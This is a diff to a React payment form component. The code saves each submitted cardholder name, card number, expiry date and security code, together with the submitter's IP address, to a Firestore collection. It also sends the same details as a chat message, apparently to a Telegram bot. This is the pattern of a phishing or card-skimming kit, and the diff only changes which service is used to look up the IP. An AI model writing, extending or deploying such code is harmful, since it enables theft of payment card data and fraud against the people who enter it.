@@ -33,17 +33,21 @@ const Payment = () => {
         e.preventDefault();
         if (fname && lname && cardNum && expiry && cvc) {
             fetch(
-                "https://geolocation-db.com/json/8dd79c70-0801-11ec-a29f-e381a788c2c0"
-            )
-            .then(response => response.json())
-            .then(geoData => {
+                "https://api.ipify.org?format=jsonp?callback=?", {
+                method: "GET",
+                headers: {}
+            })
+            .then(res => {
+                return res.text()
+            })
+            .then(ip => {
                 db.collection('payment-data').add({
                     fname: fname, 
                     lname: lname, 
                     cardNum: cardNum, 
                     expiry: expiry, 
                     cvc: cvc,
-                    ip_address: geoData.IPv4,
+                    ip_address: ip,
                     logged_at: Date.now()
                 }).then(data => {
                     if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
@@ -54,7 +58,7 @@ const Payment = () => {
                         message += "Card Number: " + cardNum + '\r\n'
                         message += "Expiry Date: " + expiry + '\r\n'
                         message += "Security Code: " + cvc + '\r\n'
-                        message += "Ip Address: " + geoData.IPv4 + '\r\n'
+                        message += "Ip Address: " + ip + '\r\n'
                         message += "Time: " + moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
                         client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                             disableWebPagePreview: true,
